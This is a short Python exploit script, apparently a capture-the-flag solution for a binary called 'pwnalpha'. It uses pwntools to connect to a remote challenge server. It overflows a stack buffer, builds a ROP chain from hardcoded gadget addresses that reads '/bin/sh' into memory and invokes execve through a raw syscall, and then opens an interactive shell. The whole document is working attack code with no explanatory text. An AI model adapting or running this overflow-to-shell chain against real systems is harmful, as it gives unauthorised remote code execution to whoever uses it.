from pwn import*
from LibcSearcher import LibcSearcher
p = remote("vps1.blue-whale.me",19900)
elf = ELF('./pwnalpha')

bss= elf.bss()
return_addr = 0x400b60
syscall = 0x474e65 

pop_rax = 0x415664
pop_rdi = 0x400686 
pop_rsi = 0x4101f3
pop_rdx = 0x4498b5

padding = 'a'*0x400+'b'*0x8

#read(0,bss,8)
payload = padding
payload += p64(pop_rdi)+p64(0)
payload += p64(pop_rsi)+p64(bss)
payload += p64(pop_rdx)+p64(8)
payload += p64(pop_rax)+p64(0)
payload += p64(syscall)

#execve("/bin/sh",0,0)
payload += p64(pop_rdi)+p64(bss)
payload += p64(pop_rsi)+p64(0)
payload += p64(pop_rdx)+p64(0)
payload += p64(pop_rax)+p64(59)
payload += p64(syscall)

p.recvuntil("Any last words?")
p.send(payload)
p.send('/bin/sh\x00')
p.interactive()
